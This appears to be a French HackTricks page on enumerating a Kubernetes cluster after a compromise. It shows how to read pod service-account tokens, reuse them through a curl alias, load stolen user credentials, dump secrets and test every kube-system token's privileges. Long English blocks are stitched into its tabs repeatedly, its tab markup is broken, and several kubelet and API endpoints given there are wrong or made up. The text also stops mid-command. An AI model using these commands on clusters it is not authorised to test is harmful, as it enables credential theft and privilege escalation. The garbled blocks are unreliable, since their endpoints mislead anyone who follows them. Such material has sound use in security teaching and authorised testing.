# √ânum√©ration de Kubernetes

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

## Jetons Kubernetes

Si vous avez compromis l'acc√®s √† une machine, l'utilisateur peut avoir acc√®s √† une plateforme Kubernetes. Le jeton est g√©n√©ralement situ√© dans un fichier point√© par la **variable d'environnement `KUBECONFIG`** ou **√† l'int√©rieur de `~/.kube`**.

Dans ce dossier, vous pouvez trouver des fichiers de configuration avec des **jetons et des configurations pour se connecter au serveur API**. Dans ce dossier, vous pouvez √©galement trouver un dossier cache avec des informations pr√©c√©demment r√©cup√©r√©es.

Si vous avez compromis un pod √† l'int√©rieur d'un environnement Kubernetes, il existe d'autres endroits o√π vous pouvez trouver des jetons et des informations sur l'environnement K8 actuel :

### Jetons de compte de service

Avant de continuer, si vous ne savez pas ce qu'est un service dans Kubernetes, je vous sugg√®re de **suivre ce lien et de lire au moins les informations sur l'architecture de Kubernetes**.

Extrait de la [documentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) de Kubernetes :

_"Lorsque vous cr√©ez un pod, si vous ne sp√©cifiez pas de compte de service, il est automatiquement assign√© au_ compte de service par d√©faut _dans le m√™me espace de noms."_

**ServiceAccount** est un objet g√©r√© par Kubernetes et utilis√© pour fournir une identit√© aux processus s'ex√©cutant dans un pod.\
Chaque compte de service a un secret qui lui est associ√© et ce secret contient un jeton d'authentification. Il s'agit d'un jeton Web JSON (JWT), une m√©thode pour repr√©senter des revendications de mani√®re s√©curis√©e entre deux parties.

G√©n√©ralement **un** des r√©pertoires suivants :

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

contient les fichiers :

* **ca.crt** : C'est le certificat ca pour v√©rifier les communications Kubernetes
* **namespace** : Il indique l'espace de noms actuel
* **token** : Il contient le **jeton de service** du pod actuel.

Maintenant que vous avez le jeton, vous pouvez trouver le serveur API dans la variable d'environnement **`KUBECONFIG`**. Pour plus d'informations, ex√©cutez `(env | set) | grep -i "kuber|kube`**`"`**

Le jeton du compte de service est sign√© par la cl√© r√©sidant dans le fichier **sa.key** et valid√© par **sa.pub**.

Emplacement par d√©faut sur **Kubernetes** :

* /etc/kubernetes/pki

Emplacement par d√©faut sur **Minikube** :

* /var/lib/localkube/certs

### Pods chauds

_**Les pods chauds sont**_ des pods contenant un jeton de compte de service privil√©gi√©. Un jeton de compte de service privil√©gi√© est un jeton qui a la permission d'effectuer des t√¢ches privil√©gi√©es telles que lister des secrets, cr√©er des pods, etc.

## RBAC

Si vous ne savez pas ce qu'est **RBAC**, **lisez cette section**.

## Feuille de triche d'√©num√©ration

Pour √©num√©rer un environnement K8s, vous avez besoin de ceci :

* Un **jeton d'authentification valide**. Dans la section pr√©c√©dente, nous avons vu o√π rechercher un jeton utilisateur et un jeton de compte de service.
* L'**adresse (**_**https://h√¥te:port**_**) de l'API Kubernetes**. Cela peut g√©n√©ralement √™tre trouv√© dans les variables d'environnement et/ou dans le fichier de configuration kube.
* **Facultatif** : Le **ca.crt pour v√©rifier le serveur API**. Cela peut √™tre trouv√© aux m√™mes endroits que le jeton. Cela est utile pour v√©rifier le certificat du serveur API, mais en utilisant `--insecure-skip-tls-verify` avec `kubectl` ou `-k` avec `curl`, vous n'aurez pas besoin de cela.

Avec ces d√©tails, vous pouvez **√©num√©rer Kubernetes**. Si l'**API** est pour une raison quelconque **accessible** via **Internet**, vous pouvez simplement t√©l√©charger ces informations et √©num√©rer la plateforme depuis votre h√¥te.

Cependant, g√©n√©ralement le **serveur API est √† l'int√©rieur d'un r√©seau interne**, donc vous devrez **cr√©er un tunnel** √† travers la machine compromise pour y acc√©der depuis votre machine, ou vous pouvez **t√©l√©charger le** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binaire, ou utiliser **`curl/wget/anything`** pour effectuer des requ√™tes HTTP brutes vers le serveur API.

### Diff√©rences entre les verbes `list` et `get`

Avec les autorisations **`get`**, vous pouvez acc√©der aux informations d'actifs sp√©cifiques (_option `describe` dans `kubectl`_) de l'API :
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Si vous avez la permission **`list`**, vous √™tes autoris√© √† ex√©cuter des requ√™tes API pour lister un type d'actif (_option `get` dans `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Si vous avez l'autorisation **`watch`**, vous √™tes autoris√© √† ex√©cuter des requ√™tes API pour surveiller les ressources :
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Ils ouvrent une connexion de streaming qui vous renvoie le manifeste complet d'un d√©ploiement chaque fois qu'il change (ou lorsqu'un nouveau est cr√©√©).

{% hint style="danger" %}
Les commandes `kubectl` suivantes indiquent simplement comment lister les objets. Si vous voulez acc√©der aux donn√©es, vous devez utiliser `describe` au lieu de `get`.
{% endhint %}

### Utilisation de curl

Depuis l'int√©rieur d'un pod, vous pouvez utiliser plusieurs variables d'environnement :
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Par d√©faut, la pod peut **acc√©der** au serveur **kube-api** dans le nom de domaine **`kubernetes.default.svc`** et vous pouvez voir le r√©seau kube dans **`/etc/resolv.config`** o√π vous trouverez l'adresse du serveur DNS de kubernetes (le ".1" de la m√™me plage est le point de terminaison kube-api).
{% endhint %}

### Utilisation de kubectl

Ayant le jeton et l'adresse du serveur API, vous utilisez kubectl ou curl pour y acc√©der comme indiqu√© ici :

Par d√©faut, l'APISERVER communique avec le sch√©ma `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> si aucun `https://` dans l'URL, vous pouvez obtenir une erreur comme une mauvaise requ√™te.

Vous pouvez trouver une [**feuille de triche officielle de kubectl ici**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Le but des sections suivantes est de pr√©senter de mani√®re ordonn√©e diff√©rentes options pour √©num√©rer et comprendre le nouveau K8s auquel vous avez acc√®s.

Pour trouver la requ√™te HTTP que `kubectl` envoie, vous pouvez utiliser le param√®tre `-v=8`

#### MitM kubectl - Proxyfication de kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configuration actuelle

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Si vous avez r√©ussi √† voler les identifiants de certains utilisateurs, vous pouvez **les configurer localement** en utilisant quelque chose comme :
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Obtenir les ressources prises en charge

Avec ces informations, vous saurez tous les services que vous pouvez r√©pertorier

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Obtenir les privil√®ges actuels

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

Kubectl is a command-line tool that allows you to run commands against Kubernetes clusters. You can use kubectl to interact with the Kubernetes API server to retrieve information about the cluster.

To list all available resources in the cluster, you can use the following command:

```bash
kubectl api-resources
```

This will show you a list of all the resources that are available in the cluster, such as pods, services, deployments, and more.

You can also use kubectl to get more detailed information about a specific resource. For example, to get information about pods, you can use the following command:

```bash
kubectl get pods
```

This will show you a list of all the pods running in the cluster, along with additional details such as the pod's IP address, status, and more.

By enumerating the Kubernetes API using kubectl, you can gather valuable information about the cluster's configuration and resources, which can help you identify potential security issues and misconfigurations.

#### Kubelet

Kubelet is the primary node agent that runs on each node in a Kubernetes cluster. It is responsible for managing the pods and containers running on the node.

You can interact with the Kubelet API to gather information about the node's configuration and resources. For example, you can use the following command to get a list of all the pods running on a specific node:

```bash
curl http://<node-ip>:10255/pods
```

This will return a list of all the pods running on the node, along with additional details such as the pod's name, namespace, and more.

By enumerating the Kubelet API on each node in the cluster, you can gain insights into the cluster's overall health and identify any potential security risks.

### Summary

Enumerating the Kubernetes API using tools like kubectl and interacting with the Kubelet API can provide valuable insights into a Kubernetes cluster's configuration and resources. This information can be crucial for identifying security issues and ensuring the cluster is properly configured and secured.

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Une autre fa√ßon de v√©rifier vos privil√®ges est d'utiliser l'outil : [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Vous pouvez en apprendre plus sur **Kubernetes RBAC** dans :

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Une fois que vous savez quels privil√®ges** vous avez, consultez la page suivante pour savoir **si vous pouvez les abuser** pour escalader les privil√®ges :

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Obtenir d'autres r√¥les

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

Kubectl is the command-line tool used to interact with Kubernetes clusters. By default, it looks for a configuration file at `~/.kube/config`. This file contains information about the cluster, authentication details, and other settings.

To list all available contexts in the kubeconfig file, use the following command:

```bash
kubectl config get-contexts
```

To view the current context, use:

```bash
kubectl config current-context
```

To list all resources in the cluster, use:

```bash
kubectl api-resources --verbs=list
```

#### API Endpoints

Kubernetes API server exposes various endpoints that can be accessed to gather information about the cluster. Some common API endpoints include:

- `/api/v1`: Core API group
- `/apis/apps/v1`: Apps API group
- `/apis/extensions/v1beta1`: Extensions API group

To list all available API groups, you can use the following command:

```bash
kubectl api-resources
```

#### Namespaces

Namespaces in Kubernetes are virtual clusters that can be used to divide cluster resources between multiple users. To list all available namespaces, use:

```bash
kubectl get namespaces
```

#### Pods

Pods are the smallest deployable units in Kubernetes that represent a single instance of a running process in the cluster. To list all pods in the cluster, use:

```bash
kubectl get pods --all-namespaces
```

#### Services

Services in Kubernetes enable communication between various parts of an application running in the cluster. To list all services, use:

```bash
kubectl get services --all-namespaces
```

#### RBAC

Role-Based Access Control (RBAC) in Kubernetes defines sets of permissions for controlling access to cluster resources. To list all roles in the cluster, use:

```bash
kubectl get roles --all-namespaces
```

To list all role bindings, use:

```bash
kubectl get rolebindings --all-namespaces
```

#### Secrets

Secrets in Kubernetes are used to store sensitive information such as passwords, OAuth tokens, and SSH keys. To list all secrets in the cluster, use:

```bash
kubectl get secrets --all-namespaces
```

#### ConfigMaps

ConfigMaps in Kubernetes store non-sensitive configuration data in key-value pairs. To list all ConfigMaps in the cluster, use:

```bash
kubectl get configmaps --all-namespaces
```

#### Nodes

Nodes in Kubernetes represent individual machines in the cluster. To list all nodes in the cluster, use:

```bash
kubectl get nodes
```

#### PersistentVolumes

PersistentVolumes in Kubernetes are storage resources that can be mounted to pods. To list all persistent volumes in the cluster, use:

```bash
kubectl get persistentvolumes
```

#### Events

Events in Kubernetes provide information about the state of resources in the cluster. To list all events, use:

```bash
kubectl get events --all-namespaces
```

#### Custom Resource Definitions (CRDs)

CRDs in Kubernetes allow users to define custom resources. To list all CRDs in the cluster, use:

```bash
kubectl get crds
```

#### Summary

Enumerating Kubernetes API involves exploring various resources, namespaces, pods, services, RBAC settings, secrets, ConfigMaps, nodes, persistent volumes, events, and custom resource definitions. Understanding these components is crucial for assessing the security posture of a Kubernetes cluster.

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Obtenir les espaces de noms

Kubernetes prend en charge **plusieurs clusters virtuels** pris en charge par le m√™me cluster physique. Ces clusters virtuels sont appel√©s **espaces de noms**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

1. List all available API resources:
   ```bash
   kubectl api-resources
   ```

2. List all resources in the default namespace:
   ```bash
   kubectl get all
   ```

3. List all resources in all namespaces:
   ```bash
   kubectl get all --all-namespaces
   ```

4. List all resources in a specific namespace:
   ```bash
   kubectl get all -n <namespace>
   ```

5. Describe a specific resource:
   ```bash
   kubectl describe <resource_type> <resource_name>
   ```

6. Get all pods in the cluster:
   ```bash
   kubectl get pods --all-namespaces
   ```

7. Get all services in the cluster:
   ```bash
   kubectl get services --all-namespaces
   ```

8. Get all deployments in the cluster:
   ```bash
   kubectl get deployments --all-namespaces
   ```

9. Get all secrets in the cluster:
   ```bash
   kubectl get secrets --all-namespaces
   ```

10. Get all configmaps in the cluster:
    ```bash
    kubectl get configmaps --all-namespaces
    ```

11. Get all roles in the cluster:
    ```bash
    kubectl get roles --all-namespaces
    ```

12. Get all role bindings in the cluster:
    ```bash
    kubectl get rolebindings --all-namespaces
    ```

13. Get all cluster roles in the cluster:
    ```bash
    kubectl get clusterroles --all-namespaces
    ```

14. Get all cluster role bindings in the cluster:
    ```bash
    kubectl get clusterrolebindings --all-namespaces
    ```

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Obtenir des secrets

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

1. List all available API groups:
   ```bash
   kubectl api-resources
   ```

2. List all resources within a specific API group:
   ```bash
   kubectl api-resources --api-group=GROUP_NAME
   ```

3. List all resources in the cluster:
   ```bash
   kubectl get --raw /
   ```

4. List all resources of a specific type:
   ```bash
   kubectl get RESOURCE_TYPE
   ```

5. List all resources of a specific type in a specific namespace:
   ```bash
   kubectl get RESOURCE_TYPE -n NAMESPACE
   ```

6. List all resources of all types in a specific namespace:
   ```bash
   kubectl get --raw /apis/RESOURCE_TYPE -n NAMESPACE
   ```

7. List all resources of all types in all namespaces:
   ```bash
   kubectl get --raw /apis -n NAMESPACE
   ```

#### Kubelet

1. List all available API groups:
   ```bash
   curl -k https://KUBELET_IP:10250/pods/
   ```

2. List all pods:
   ```bash
   curl -k https://KUBELET_IP:10250/pods/
   ```

3. List all pods in a specific namespace:
   ```bash
   curl -k https://KUBELET_IP:10250/namespaces/NAMESPACE/pods/
   ```

4. List all nodes:
   ```bash
   curl -k https://KUBELET_IP:10250/nodes/
   ```

5. List all services:
   ```bash
   curl -k https://KUBELET_IP:10250/services/
   ```

6. List all endpoints:
   ```bash
   curl -k https://KUBELET_IP:10250/endpoints/
   ```

7. List all secrets:
   ```bash
   curl -k https://KUBELET_IP:10250/secrets/
   ```

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Si vous pouvez lire les secrets, vous pouvez utiliser les lignes suivantes pour obtenir les privil√®ges li√©s √† chaque jeton :
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Obtenir les comptes de service

Comme discut√© au d√©but de cette page, **lorsqu'un pod est ex√©cut√©, un compte de service lui est g√©n√©ralement attribu√©**. Par cons√©quent, lister les comptes de service, leurs autorisations et leur emplacement d'ex√©cution peut permettre √† un utilisateur de prendre des privil√®ges suppl√©mentaires.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

1. List all available API groups:
   ```bash
   kubectl api-resources --verbs=list
   ```

2. List all resources within a specific API group:
   ```bash
   kubectl api-resources --api-group=extensions
   ```

3. List all resources in the cluster:
   ```bash
   kubectl api-resources
   ```

4. List all resources in a specific namespace:
   ```bash
   kubectl api-resources --namespaced=true
   ```

#### Kubelet

1. Access the kubelet API server:
   ```bash
   curl http://localhost:10255/pods
   ```

2. Access the kubelet healthz endpoint:
   ```bash
   curl http://localhost:10248/healthz
   ```

3. Access the kubelet stats endpoint:
   ```bash
   curl http://localhost:10255/stats/summary
   ```

#### Kubernetes API Server

1. Access the Kubernetes API server:
   ```bash
   curl https://<kubernetes-api-server-ip>:6443
   ```

2. Access the Kubernetes API server version:
   ```bash
   curl https://<kubernetes-api-server-ip>:6443/version
   ```

3. Access the Kubernetes API server healthz endpoint:
   ```bash
   curl https://<kubernetes-api-server-ip>:6443/healthz
   ```

4. Access the Kubernetes API server metrics:
   ```bash
   curl https://<kubernetes-api-server-ip>:6443/metrics
   ```

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Obtenir les d√©ploiements

Les d√©ploiements sp√©cifient les **composants** qui doivent √™tre **ex√©cut√©s**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### 1. **Discovering API Server**

To find the Kubernetes API server URL, you can check the `~/.kube/config` file or use the following command:

```bash
kubectl cluster-info
```

#### 2. **Enumerating API Endpoints**

You can list all available API endpoints by sending a request to the following URL:

```plaintext
https://<api-server>/swaggerapi/
```

#### 3. **Enumerating API Resources**

To list all available API resources, you can send a request to the following URL:

```plaintext
https://<api-server>/api/
```

#### 4. **Enumerating API Versions**

To list all available API versions, you can send a request to the following URL:

```plaintext
https://<api-server>/version/
```

#### 5. **Enumerating API Groups**

To list all available API groups, you can send a request to the following URL:

```plaintext
https://<api-server>/apis/
```

#### 6. **Enumerating Namespaces**

To list all available namespaces, you can send a request to the following URL:

```plaintext
https://<api-server>/api/v1/namespaces/
```

#### 7. **Enumerating Nodes**

To list all available nodes, you can send a request to the following URL:

```plaintext
https://<api-server>/api/v1/nodes/
```

#### 8. **Enumerating Pods**

To list all available pods, you can send a request to the following URL:

```plaintext
https://<api-server>/api/v1/pods/
```

#### 9. **Enumerating Services**

To list all available services, you can send a request to the following URL:

```plaintext
https://<api-server>/api/v1/services/
```

#### 10. **Enumerating Deployments**

To list all available deployments, you can send a request to the following URL:

```plaintext
https://<api-server>/apis/apps/v1/deployments/
```

#### 11. **Enumerating Secrets**

To list all available secrets, you can send a request to the following URL:

```plaintext
https://<api-server>/api/v1/secrets/
```

#### 12. **Enumerating ConfigMaps**

To list all available ConfigMaps, you can send a request to the following URL:

```plaintext
https://<api-server>/api/v1/configmaps/
```

#### 13. **Enumerating PersistentVolumes**

To list all available PersistentVolumes, you can send a request to the following URL:

```plaintext
https://<api-server>/api/v1/persistentvolumes/
```

#### 14. **Enumerating StorageClasses**

To list all available StorageClasses, you can send a request to the following URL:

```plaintext
https://<api-server>/apis/storage.k8s.io/v1/storageclasses/
```

#### 15. **Enumerating Roles**

To list all available roles, you can send a request to the following URL:

```plaintext
https://<api-server>/apis/rbac.authorization.k8s.io/v1/roles/
```

#### 16. **Enumerating RoleBindings**

To list all available role bindings, you can send a request to the following URL:

```plaintext
https://<api-server>/apis/rbac.authorization.k8s.io/v1/rolebindings/
```

#### 17. **Enumerating ServiceAccounts**

To list all available service accounts, you can send a request to the following URL:

```plaintext
https://<api-server>/api/v1/serviceaccounts/
```

#### 18. **Enumerating NetworkPolicies**

To list all available network policies, you can send a request to the following URL:

```plaintext
https://<api-server>/apis/networking.k8s.io/v1/networkpolicies/
```

#### 19. **Enumerating Ingresses**

To list all available ingresses, you can send a request to the following URL:

```plaintext
https://<api-server>/apis/networking.k8s.io/v1/ingresses/
```

#### 20. **Enumerating CustomResourceDefinitions**

To list all available custom resource definitions, you can send a request to the following URL:

```plaintext
https://<api-server>/apis/apiextensions.k8s.io/v1/customresourcedefinitions/
```

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Obtenir des Pods

Les Pods sont les **conteneurs** r√©els qui vont **s'ex√©cuter**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

1. List all available API groups:
   ```bash
   kubectl api-resources
   ```

2. List all resources within a specific API group:
   ```bash
   kubectl api-resources --api-group=GROUP_NAME
   ```

3. List all resources in the cluster:
   ```bash
   kubectl get --raw /
   ```

4. List all resources of a specific type:
   ```bash
   kubectl get RESOURCE_TYPE
   ```

5. Describe a specific resource:
   ```bash
   kubectl describe RESOURCE RESOURCE_NAME
   ```

6. Get all resources of all types in the cluster:
   ```bash
   kubectl get all --all-namespaces
   ```

7. Get all resources of all types in a specific namespace:
   ```bash
   kkubectl get all -n NAMESPACE
   ```

#### Kubelet

1. List all available API versions:
   ```bash
   curl -k https://KUBELET_IP:10250/pods/
   ```

2. List all available pods:
   ```bash
   curl -k https://KUBELET_IP:10250/pods/
   ```

3. List all available containers within a pod:
   ```bash
   curl -k https://KUBELET_IP:10250/runningpods/
   ```

4. List all available images within a pod:
   ```bash
   curl -k https://KUBELET_IP:10250/images/
   ```

5. List all available logs for a specific pod:
   ```bash
   curl -k https://KUBELET_IP:10250/logs/POD_NAME
   ```

6. List all available environment variables for a specific pod:
   ```bash
   curl -k https://KUBELET_IP:10250/env/POD_NAME
   ```

7. List all available stats for a specific pod:
   ```bash
   curl -k https://KUBELET_IP:10250/stats/POD_NAME
   ```

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Obtenir les Services

Les **services Kubernetes** sont utilis√©s pour **exposer un service sur un port et une IP sp√©cifiques** (qui agiront comme un √©quilibreur de charge vers les pods qui offrent r√©ellement le service). Il est int√©ressant de savoir o√π vous pouvez trouver d'autres services √† essayer d'attaquer.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

Kubectl is the command-line tool used to interact with Kubernetes clusters. By default, it looks for a configuration file at `~/.kube/config`. This file contains information about the cluster, user, and authentication method.

To list all available contexts:

```bash
kubectl config get-contexts
```

To switch between contexts:

```bash
kubectl config use-context <context-name>
```

To list all available namespaces:

```bash
kubectl get namespaces
```

To list all resources in a namespace:

```bash
kubectl api-resources --namespaced=true
kubectl api-resources --namespaced=false
```

#### API Server

The Kubernetes API server exposes a variety of endpoints that can be accessed to gather information about the cluster. Some useful endpoints include:

- `/api/v1`: Core API group
- `/apis`: All API groups
- `/healthz`: Health check endpoint
- `/version`: Kubernetes version information

To access these endpoints, you can use tools like `curl` or `kubectl`:

```bash
curl http://<api-server-ip>/api/v1
kubectl get --raw /api/v1
```

#### RBAC

Role-Based Access Control (RBAC) is used to control access to resources in a Kubernetes cluster. To view roles and role bindings:

```bash
kubectl get roles
kubectl get rolebindings
```

#### Service Accounts

Service accounts are used by pods to authenticate to the Kubernetes API. To list service accounts:

```bash
kubectl get serviceaccounts
```

#### Secrets

Kubernetes secrets store sensitive information such as passwords, OAuth tokens, and SSH keys. To list secrets in a namespace:

```bash
kubectl get secrets
```

#### Nodes

Nodes are the individual servers that make up a Kubernetes cluster. To list nodes:

```bash
kubectl get nodes
```

#### Pod Security Policies

Pod Security Policies define the security settings that pods must adhere to. To list pod security policies:

```bash
kubectl get psp
```

#### Network Policies

Network Policies control traffic between pods in a Kubernetes cluster. To list network policies:

```bash
kubectl get networkpolicies
```

#### Persistent Volumes

Persistent Volumes (PVs) are storage resources in a Kubernetes cluster. To list persistent volumes:

```bash
kubectl get pv
```

#### Storage Classes

Storage Classes define different classes of storage in a Kubernetes cluster. To list storage classes:

```bash
kubectl get storageclasses
```

#### Custom Resource Definitions

Custom Resource Definitions (CRDs) allow users to define custom resources in a Kubernetes cluster. To list CRDs:

```bash
kubectl get crds
```

#### Helm

Helm is a package manager for Kubernetes that simplifies the deployment and management of applications. To list installed charts:

```bash
helm list
```

#### Other Tools

Other tools that can be useful for enumerating Kubernetes clusters include:

- `kubectx`: Tool for switching between Kubernetes contexts
- `kubens`: Tool for switching between Kubernetes namespaces
- `kube-hunter`: Security tool for Kubernetes clusters

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### Obtenir les n≈ìuds

Obtenez tous les **n≈ìuds configur√©s √† l'int√©rieur du cluster**.
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

1. List all available API groups:
   ```bash
   kubectl api-resources --verbs=list
   ```

2. List all resources within a specific API group:
   ```bash
   kubectl api-resources --api-group=extensions
   ```

3. List all resources in the cluster:
   ```bash
   kubectl api-resources
   ```

4. List all resources in a specific namespace:
   ```bash
   kubectl api-resources --namespaced=true
   ```

#### Kubelet

1. List all available API versions:
   ```bash
   curl -k https://<kubelet-ip>:10250/pods/
   ```

2. List all available API resources:
   ```bash
   curl -k https://<kubelet-ip>:10250/pods/ --header "Content-Type: application/json"
   ```

3. List all available API endpoints:
   ```bash
   curl -k https://<kubelet-ip>:10250/
   ```

4. List all available API server information:
   ```bash
   curl -k https://<kubelet-ip>:10250/metrics/
   ```

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### Obtenir les DaemonSets

Les **DaemonSets** permettent de s'assurer qu'un **pod sp√©cifique s'ex√©cute sur tous les n≈ìuds** du cluster (ou sur ceux s√©lectionn√©s). Si vous supprimez le DaemonSet, les pods qu'il g√®re seront √©galement supprim√©s.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

1. List all available API groups:
   ```bash
   kubectl api-resources
   ```

2. List all resources within a specific API group:
   ```bash
   kubectl api-resources --api-group=GROUP_NAME
   ```

3. List all resources in the cluster:
   ```bash
   kubectl get --raw /
   ```

4. List all resources of a specific type:
   ```bash
   kubectl get RESOURCE_TYPE
   ```

5. List all resources of a specific type in a specific namespace:
   ```bash
   kubectl get RESOURCE_TYPE -n NAMESPACE
   ```

6. Describe a specific resource:
   ```bash
   kubectl describe RESOURCE RESOURCE_NAME
   ```

7. Get the logs of a specific pod:
   ```bash
   kubectl logs POD_NAME
   ```

8. Execute a command in a specific pod:
   ```bash
   kubectl exec -it POD_NAME -- COMMAND
   ```

9. Port forward to a specific pod:
   ```bash
   kubectl port-forward POD_NAME LOCAL_PORT:REMOTE_PORT
   ```

10. Access the Kubernetes API server:
    ```bash
    kubectl proxy
    ```

#### Kubelet

1. Access the kubelet API server:
   ```bash
   curl http://NODE_IP:10255/pods
   ```

2. Access the kubelet healthz endpoint:
   ```bash
   curl http://NODE_IP:10248/healthz
   ```

3. Access the kubelet pprof endpoint:
   ```bash
   curl http://NODE_IP:10255/debug/pprof/
   ```

4. Access the kubelet stats endpoint:
   ```bash
